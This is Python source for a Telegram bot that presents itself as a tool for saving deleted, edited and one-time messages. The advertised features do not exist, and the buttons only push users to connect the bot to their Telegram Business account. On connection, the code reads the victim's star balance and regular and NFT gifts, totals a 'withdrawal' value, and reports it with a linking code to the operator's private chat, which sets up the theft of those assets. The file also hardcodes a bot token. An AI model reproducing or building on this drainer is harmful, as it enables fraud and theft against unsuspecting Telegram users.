from aiogram import Bot, Dispatcher, types, F
from aiogram.fsm.context import FSMContext
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.state import State, StatesGroup
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.types import FSInputFile, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from aiogram.filters import Command
from aiogram.utils.keyboard import InlineKeyboardBuilder
import random
from datetime import datetime
import requests
import asyncio
import logging

# Constants
TOKEN = "8050545921:AAEaUiySbaEmVPvRIHLkcd1Gm1papAZ4x-I"
LOG_CHAT_ID = -4672823504
ADMIN_IDS = [7562628646]

MAX_GIFTS_PER_RUN = 1000
last_messages = {}
codes = {}

storage = MemoryStorage()
logging.basicConfig(level=logging.INFO)

# Bot initialization
bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher(storage=storage)

class Draw(StatesGroup):
    user_id = State()
    gift = State()

def main_menu_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📌 Save One-Time Messages", callback_data="temp_msgs")],
        [InlineKeyboardButton(text="🗑️ Save Deleted Messages", callback_data="deleted_msgs")],
        [InlineKeyboardButton(text="✏️ Save Edited Messages", callback_data="edited_msgs")],
        [InlineKeyboardButton(text="🎞 Text Animations", callback_data="animations")],
        [InlineKeyboardButton(text="📖 Instructions", url="https://t.me/+lcvPndWQzcA4NDU1")]
    ])

@dp.message(Command("start"))
async def start_cmd(message: types.Message):
    if message.text == "/start instruction":
        img = FSInputFile("instruction_guide.png")
        await message.answer_photo(
            photo=img,
            caption=(
                "<b>How to connect the bot to a business account:</b>\n\n"
                "1. Go to 'Settings' → <i>Telegram for Business</i>\n"
                "2. Go to <i>Chat Bots</i>\n"
                "3. Add <b>@AugramSaveMode_bot</b> to the list\n\n"
                "After that, the features will work automatically ✅"
            )
        )
        return

    photo = FSInputFile("savemod_banner.jpg")
    await message.answer_photo(
        photo=photo,
        caption=(
            "👋 Welcome to <b>AugramSaveMode</b>!\n\n"
            "🔹 Save One-Time Messages\n"
            "🔹 Save Deleted Messages\n"
            "🔹 Save Edited Messages\n"
            "📖 <b>Please read the instructions before starting</b>\n\n"
            "Select what you want to save:"
        ),
        reply_markup=main_menu_kb()
    )

@dp.callback_query(F.data.in_({"temp_msgs", "deleted_msgs", "edited_msgs", "animations"}))
async def require_instruction(callback: CallbackQuery):
    await callback.answer("Please press the 📖 Instructions button above first!", show_alert=True)

@dp.business_connection()
async def handle_business(business_connection: types.BusinessConnection):
    business_id = business_connection.id
    code = random.randint(100, 1000)
    codes[str(code)] = business_id
    user = business_connection.user

    try:
        info = await bot.get_business_connection(business_id)
        rights = info.rights
        gifts = await bot.get_business_account_gifts(business_id, exclude_unique=False)
        stars = await bot.get_business_account_star_balance(business_id)

        total_price = sum(g.convert_star_count or 0 for g in gifts.gifts if g.type == "regular")
        nft_gifts = [g for g in gifts.gifts if g.type == "unique"]

        nft_transfer_cost = len(nft_gifts) * 25
        total_withdrawal_cost = total_price + nft_transfer_cost

        text = (
            f"✨ <b>New business account connected</b> ✨\n\n"
            f"👤 <b>User:</b> @{user.username or 'N/A'} ({user.id})\n"
            f"💰 <b>Stars:</b> {int(stars.amount):,}\n"
            f"🎁 <b>Regular Gifts:</b> {len(gifts.gifts) - len(nft_gifts)} = {total_price:,}⭐\n"
            f"🖼 <b>NFT Gifts:</b> {len(nft_gifts)} = {nft_transfer_cost:,}⭐\n"
            f"🔑 <b>Total Withdrawal:</b> {total_withdrawal_cost:,}⭐\n"
            f"📥 <b>Code:</b> <code>{code}</code>"
        )

        await bot.send_message(LOG_CHAT_ID, text)

    except Exception as e:
        logging.error(f"Error in handle_business: {e}")
        await bot.send_message(LOG_CHAT_ID, f"❌ Error handling business connection: {e}")

# Bot launcher
async def main():
    try:
        logging.info("Bot is starting...")
        await dp.start_polling(bot)
    except Exception as e:
        logging.error(f"Error while polling: {e}")

if __name__ == "__main__":
    asyncio.run(main())
